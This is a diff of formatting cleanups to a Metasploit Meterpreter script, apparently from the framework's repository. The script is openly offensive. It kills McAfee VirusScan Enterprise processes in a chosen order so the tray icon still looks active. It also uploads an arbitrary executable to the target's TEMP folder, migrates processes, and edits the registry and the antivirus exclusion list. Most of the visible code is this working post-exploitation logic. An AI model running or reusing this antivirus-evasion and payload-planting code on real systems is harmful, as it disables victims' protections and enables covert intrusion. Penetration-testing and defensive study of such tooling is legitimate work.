@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Meterpreter script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes in magic
 # order which keeps VirusScan icon visible at system tray without disabled sign on it.
@@ -17,13 +17,13 @@
 
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
-  "-h" => [ false,"Help menu." ],
-  "-k" => [ false,"Only kills VirusScan processes"],
-  "-e" => [ true,"Executable to upload to target host. (modifies registry and exclusion list)" ]
+  "-h" => [ false, "Help menu." ],
+  "-k" => [ false, "Only kills VirusScan processes"],
+  "-e" => [ true, "Executable to upload to target host. (modifies registry and exclusion list)" ]
 )
 
 ################## function declaration Declarations ##################
-def usage()
+def usage
   print_line "\nAuthor: Mert SARICA (mert.sarica [@] gmail.com) \t\tWeb: http://www.mertsarica.com"
   print_line "----------------------------------------------------------------------------------------------"
   print_line "Bypasses Mcafee VirusScan Enterprise v8.7.0i+, uploads an executable to TEMP folder adds it"
@@ -35,34 +35,34 @@ end
 @path = ""
 @location = ""
 
-def upload(session,file,trgloc)
-  if not ::File.exist?(file)
+def upload(session, file, _trgloc)
+  if !::File.exist?(file)
     raise "File to Upload does not exists!"
   else
     @location = session.sys.config.getenv('TEMP')
     begin
       ext = file.scan(/\S*(.exe)/i)
-      if ext.join == ".exe"
-        fileontrgt = "#{@location}\\MS#{rand(100)}.exe"
-      else
-        fileontrgt = "#{@location}\\MS#{rand(100)}#{ext}"
-      end
+      fileontrgt = if ext.join == ".exe"
+                     "#{@location}\\MS#{rand(100)}.exe"
+                   else
+                     "#{@location}\\MS#{rand(100)}#{ext}"
+                   end
       @path = fileontrgt
       print_status("Uploading #{file}....")
-      session.fs.file.upload_file("#{fileontrgt}","#{file}")
+      session.fs.file.upload_file(fileontrgt.to_s, file.to_s)
       print_status("Uploaded as #{fileontrgt}")
     rescue ::Exception => e
       print_status("Error uploading file #{file}: #{e.class} #{e}")
     end
   end
-  return fileontrgt
+  fileontrgt
 end
 
-#parsing of Options
+# parsing of Options
 file = ""
 helpcall = 0
 killonly = 0
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-e"
     file = val || ""
@@ -71,8 +71,7 @@ killonly = 0
   when "-k"
     killonly = 1
   end
-
-}
+end
 
 if killonly == 0
   if file == ""
@@ -82,7 +81,7 @@ if killonly == 0
 end
 
 # Magic kill order :)
-avs = %W{
+avs = %w(
   shstat.exe
   engineserver.exe
   frameworkservice.exe
@@ -91,17 +90,14 @@ avs = %W{
   mfeann.exe
   vstskmgr.exe
   mcshield.exe
-}
+)
 
 av = 0
 
-plist = client.sys.process.get_processes()
+plist = client.sys.process.get_processes
 plist.each do |x|
-  if (avs.index(x['name'].downcase))
-    av = av + 1
-  end
+  av += 1 if avs.index(x['name'].downcase)
 end
-
 
 if av > 6
   print_status("VirusScan Enterprise v8.7.0i+ is running...")
@@ -118,7 +114,7 @@ print_status("Migrating to #{target}...")
 # Get the target process pid
 target_pid = client.sys.process[target]
 
-if not target_pid
+unless target_pid
   print_error("Could not access the target process")
   raise Rex::Script::Completed
 end
@@ -144,7 +140,7 @@ else
   end
 
   # Upload it
-  exec = upload(session,file,"")
+  exec = upload(session, file, "")
 
   # Initiailze vars
   key   = nil
